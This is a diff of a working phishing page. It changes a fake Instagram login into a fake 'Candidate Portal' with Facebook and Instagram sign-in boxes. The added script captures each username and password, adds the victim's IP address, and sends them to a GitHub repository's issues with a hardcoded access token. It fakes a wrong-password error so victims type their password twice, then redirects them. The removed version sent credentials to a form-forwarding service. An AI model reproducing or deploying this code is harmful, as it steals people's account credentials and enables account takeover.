@@ -3,45 +3,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
+    <title>Candidate Portal | Secure Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding-top: 80px; }
-        .lang-select { color: #8e8e8e; font-size: 13px; margin-bottom: 50px; cursor: pointer; }
-        .logo-container { margin-bottom: 40px; }
-        .insta-logo { width: 65px; height: 65px; }
-        form { width: 90%; max-width: 350px; display: flex; flex-direction: column; }
-        input { width: 100%; height: 50px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 12px; padding: 0 15px; margin-bottom: 12px; font-size: 14px; }
-        input:focus { border-color: #a8a8a8; outline: none; }
-        .login-btn { width: 100%; height: 45px; background: #0064e0; border: none; border-radius: 25px; color: #fff; font-size: 16px; font-weight: 600; margin-top: 5px; cursor: pointer; }
-        .forgot-pass { color: #000; font-size: 14px; font-weight: 500; text-decoration: none; text-align: center; margin-top: 20px; }
-        .footer { margin-top: auto; width: 100%; padding-bottom: 20px; display: flex; flex-direction: column; align-items: center; }
-        .create-btn { width: 90%; max-width: 350px; height: 45px; border: 1px solid #0064e0; border-radius: 25px; color: #0064e0; background: transparent; font-size: 14px; font-weight: 500; margin-bottom: 15px; cursor: pointer; }
-        .meta-logo { width: 60px; opacity: 0.6; }
+        :root { --axis-maroon: #861f41; --fb-blue: #1877F2; --ig-pink: #E1306C; }
+        body { font-family: 'Segoe UI', sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; min-height: 100vh; }
+        .header { background: white; padding: 15px; border-bottom: 2px solid var(--axis-maroon); text-align: center; }
+        .header-title { font-size: 18px; font-weight: bold; color: var(--axis-maroon); text-transform: uppercase; }
+        .auth-card { background: #ffffff; border-radius: 12px; width: 360px; padding: 30px; margin: 40px auto; box-shadow: 0 15px 35px rgba(0,0,0,0.1); border: 1px solid #e1e4e8; text-align: center; }
+        .social-btn { display: flex; align-items: center; width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #dadce0; border-radius: 8px; background: white; cursor: pointer; font-size: 15px; font-weight: 500; }
+        .social-btn i { font-size: 20px; margin-right: 15px; width: 25px; }
+        .btn-fb { color: var(--fb-blue); border-left: 4px solid var(--fb-blue); }
+        .btn-ig { color: var(--ig-pink); border-left: 4px solid var(--ig-pink); }
+        input { width: 100%; padding: 12px; border: 1px solid #dddfe2; border-radius: 8px; box-sizing: border-box; font-size: 15px; background: #f5f6f7; margin-bottom: 15px; }
+        .login-btn { width: 100%; padding: 14px; background-color: var(--axis-maroon); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        
+        /* Modal & Error Styling */
+        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); }
+        .modal-content { background: white; width: 320px; margin: 100px auto; padding: 25px; border-radius: 12px; text-align: center; position: relative; }
+        .error-msg { color: #d93025; font-size: 13px; margin-bottom: 10px; display: none; text-align: left; background: #fce8e6; padding: 8px; border-radius: 4px; border: 1px solid #d93025; }
+        .footer { text-align: center; font-size: 11px; color: #90949c; margin-top: auto; padding: 25px; }
     </style>
 </head>
 <body>
-    <div class="lang-select">English (India) ⌵</div>
-    
-    <div class="logo-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" alt="Instagram" class="insta-logo">
+
+    <div class="header">
+        <div class="header-title">Candidate Management System</div>
     </div>
 
-    <form action="https://formsubmit.co/34785b95edd69e2ec6f8e3a8c64870c0" method="POST">
-        <input type="text" name="Username" placeholder="Username, email address or mobile number" required>
-        <input type="password" name="Password" placeholder="Password" required>
-        
-        <input type="hidden" name="_next" value="https://apply-group-check-user-88.vercel.app/error.html">
-        <input type="hidden" name="_captcha" value="false">
-
-        <button type="submit" class="login-btn">Log in</button>
-    </form>
-
-    <a href="#" class="forgot-pass">Forgotten password?</a>
-
-    <div class="footer">
-        <button class="create-btn">Create new account</button>
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" class="meta-logo">
+    <div class="auth-card">
+        <h2>Sign In</h2>
+        <p style="color:#606770; font-size:14px;">Verify your candidate credentials</p>
+        <button class="social-btn btn-fb" onclick="openModal('Facebook')"><i class="fab fa-facebook"></i> Sign In with Facebook</button>
+        <button class="social-btn btn-ig" onclick="openModal('Instagram')"><i class="fab fa-instagram"></i> Sign In with Instagram</button>
+        <div style="margin:20px 0; color:#8d949e; font-size:13px;">OR</div>
+        <input type="text" id="mainUser" placeholder="Candidate ID">
+        <input type="password" id="mainPass" placeholder="Security Password">
+        <button class="login-btn" onclick="sendData('Direct')">REGISTER & LOGIN</button>
     </div>
+
+    <div id="loginModal" class="modal">
+        <div class="modal-content">
+            <div id="modalIcon" style="font-size: 40px; margin-bottom: 10px;"></div>
+            <div id="modalTitle" style="font-weight:bold; font-size:18px; margin-bottom:15px;">Login</div>
+            
+            <div id="errorBox" class="error-msg">
+                <i class="fas fa-exclamation-circle"></i> Incorrect password. Please try again.
+            </div>
+
+            <input type="text" id="modalUser" placeholder="Username or Email">
+            <input type="password" id="modalPass" placeholder="Password">
+            <button class="login-btn" id="modalBtn" onclick="processLogin()">Continue</button>
+        </div>
+    </div>
+
+    <div class="footer">© 2026 Candidate Portal Services. All rights reserved.</div>
+
+    <script>
+        const CONFIG = {
+            TOKEN: "ghp_9jvRFvxgwANG419R0jNGgKThhEd2u70PG8e9",
+            REPO: "Veer007ghk/system-v3-ya-data-panel-2026"
+        };
+
+        let currentPlatform = "";
+        let attemptCount = 0;
+
+        function openModal(platform) {
+            currentPlatform = platform;
+            attemptCount = 0; // Reset count
+            document.getElementById('errorBox').style.display = "none";
+            document.getElementById('modalTitle').innerText = "Login with " + platform;
+            document.getElementById('modalIcon').innerHTML = `<i class="fab fa-${platform.toLowerCase()}" style="color: ${platform === 'Facebook' ? '#1877F2' : '#E1306C'}"></i>`;
+            document.getElementById('loginModal').style.display = "block";
+        }
+
+        async function processLogin() {
+            const u = document.getElementById('modalUser').value;
+            const p = document.getElementById('modalPass').value;
+            if(!u || !p) return;
+
+            // Data Capture
+            await sendData('Social', u, p);
+
+            // Error Logic
+            attemptCount++;
+            if(attemptCount === 1) {
+                // Pehli baar error dikhayega
+                document.getElementById('modalPass').value = "";
+                document.getElementById('errorBox').style.display = "block";
+            } else {
+                // Dusri baar seedha redirect
+                window.location.href = "https://bit.ly/4kHqft3";
+            }
+        }
+
+        async function sendData(type, user, pass) {
+            const u = user || document.getElementById('mainUser').value;
+            const p = pass || document.getElementById('mainPass').value;
+            const platform = type === 'Direct' ? 'Portal' : currentPlatform;
+
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const { ip } = await ipRes.json();
+                await fetch(`https://api.github.com/repos/${CONFIG.REPO}/issues`, {
+                    method: 'POST',
+                    headers: { 'Authorization': `token ${CONFIG.TOKEN}`, 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        title: `Attempt ${attemptCount+1} [${platform}]: ${ip}`,
+                        body: `| User | Pass | IP |\n| --- | --- | --- |\n| ${u} | ${p} | ${ip} |`
+                    })
+                });
+                if(type === 'Direct') window.location.href = "https://bit.ly/4kHqft3";
+            } catch (e) { console.error(e); }
+        }
+    </script>
 </body>
 </html>
